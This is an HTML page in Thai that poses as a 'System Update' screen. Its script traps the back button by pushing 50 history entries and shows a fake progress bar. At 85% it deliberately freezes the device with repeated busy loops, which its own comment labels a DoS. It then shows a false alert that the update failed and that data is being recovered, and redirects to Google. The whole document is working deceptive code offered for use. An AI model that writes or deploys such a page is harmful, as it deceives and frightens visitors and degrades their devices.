<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Update</title>
    <style>
        body { background-color: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; user-select: none; -webkit-user-select: none; }
        .container { text-align: center; width: 80%; }
        .logo { width: 60px; height: 60px; margin-bottom: 40px; opacity: 0.8; }
        .progress-bar { width: 100%; height: 4px; background-color: #333; border-radius: 2px; margin-bottom: 20px; overflow: hidden; }
        .progress-fill { width: 0%; height: 100%; background-color: #fff; border-radius: 2px; transition: width 0.5s linear; }
        .status-text { font-size: 14px; color: #aaa; margin-bottom: 8px; }
        .warning-text { font-size: 12px; color: #888; margin-top: 30px; line-height: 1.5; }
    </style>
</head>
<body>
    <div class="container">
        <div style="display:inline-block; width:60px; height:60px; border-radius:50%; border: 3px solid #fff; opacity:0.7; margin-bottom:30px;"></div>
        
        <div class="status-text">กำลังอัปเดตซอฟต์แวร์...</div>
        <div class="progress-bar">
            <div class="progress-fill" id="progress"></div>
        </div>
        <div class="status-text" id="percent">0%</div>
        
        <div class="warning-text">
            ห้ามปิดเครื่องหรือตัดการเชื่อมต่ออินเทอร์เน็ต<br>
            เครื่องอาจมีการรีสตาร์ทหลายครั้ง
        </div>
    </div>

    <script>
        window.onload = function() {
            // ล็อคปุ่มย้อนกลับแบบจัดเต็ม
            for(let i=0; i<50; i++) { history.pushState(null, null, window.location.href); }

            let progress = 0;
            const progressEl = document.getElementById('progress');
            const percentEl = document.getElementById('percent');

            // สคริปต์จำลองเปอร์เซ็นต์โหลด
            const loader = setInterval(() => {
                progress += Math.random() * 5;
                if (progress >= 85) {
                    clearInterval(loader);
                    progress = 85;
                    // พอโหลดถึง 85% ค่อยเริ่มทำให้เครื่องค้าง (DoS)
                    startStressing();
                }
                progressEl.style.width = progress + '%';
                percentEl.innerText = Math.round(progress) + '%';
            }, 200);

            function startStressing() {
                // หลอกว่ามีข้อผิดพลาด
                setTimeout(() => {
                    // ทำให้เครื่องค้างรัวๆ เป็นจังหวะ
                    const stressInterval = setInterval(() => {
                        const targetTime = Date.now() + 2000; // ค้างครั้งละ 2 วินาที
                        while (Date.now() < targetTime) {
                            // Heavy computation
                            Math.pow(Math.random(), Math.random());
                        }
                    }, 500); // ทำซ้ำทุกๆ 0.5 วินาที

                    // หยุดทำหลังจาก 15 วินาที
                    setTimeout(() => {
                        clearInterval(stressInterval);
                        alert("การอัปเดตล้มเหลว (Error Code: 0x80070005)\nระบบกำลังพยายามกู้คืนข้อมูล...");
                        window.location.href = "https://www.google.com"; // ส่งกลับหน้าปกติ
                    }, 15000);

                }, 1000);
            }
        };
    </script>
</body>
</html>
